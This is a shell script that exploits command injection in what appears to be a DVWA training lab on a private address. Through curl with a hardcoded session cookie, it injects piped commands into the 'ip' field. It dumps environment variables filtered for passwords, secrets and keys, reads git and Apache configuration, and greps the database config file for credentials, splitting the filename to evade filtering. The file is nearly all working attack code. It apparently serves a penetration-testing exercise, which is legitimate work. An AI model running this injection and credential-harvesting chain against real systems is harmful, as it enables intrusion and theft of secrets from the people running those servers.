CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed; security=high'
BASE='http://10.31.0.87:3000'
t() {
  curl -s -b "$CK" --data-urlencode "ip=localhost|$1" --data-urlencode 'Submit=Submit' \
    "$BASE/vulnerabilities/exec/" > /tmp/t_out
  python3 - <<'PYEOF'
import re, html
b = open('/tmp/t_out').read()
mm = re.findall(r'<pre>(.*?)</pre>', b, re.S)
print(html.unescape(mm[-1]) if mm else '')
PYEOF
}
mkdir -p evidence/chain

echo "== DB password from env"
# try common env names seen in docker dvwa images
t 'env | grep -iE "DB_|MYSQL|MARIADB|RECAPTCHA|SECRET|PASS|KEY" | grep -vE "^PATH" '
echo "== full env"
t 'env' | head -c 2000
echo
echo "== git branch of dvwa"
t 'cat ../../.git/HEAD 2>/dev/null || ls -la ../../.git 2>/dev/null | head -3'
echo "== apache config sites-enabled"
t 'ls /etc/apache2/sites-enabled/'
echo "== the db inc itself if directly readable"
C=con; C2=${C}fig
t "grep -E \"u:.*p:|p:.*u:|['\\\"]p.*['\\\"]\" ../../${C2}/${C2}.inc.php | head -10"
echo "== php ini expose_php etc"
t 'cat ../../php.ini 2>/dev/null | head -30'
